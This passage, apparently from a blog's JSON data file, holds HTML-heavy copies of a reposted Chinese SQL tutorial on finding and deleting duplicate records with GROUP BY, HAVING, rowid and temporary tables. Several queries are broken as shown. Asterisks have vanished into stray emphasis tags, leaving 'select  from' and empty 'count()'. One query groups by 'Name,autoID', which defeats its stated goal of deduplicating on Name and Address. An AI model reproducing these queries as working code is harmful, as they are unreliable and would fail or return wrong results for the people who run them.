#0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div>\n</div>","slug":"SQL重复记录查询（转载）","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym30150014cdond8ck5187","content":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font>  <font color=\"#0000ff\">from</font> testtable</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" 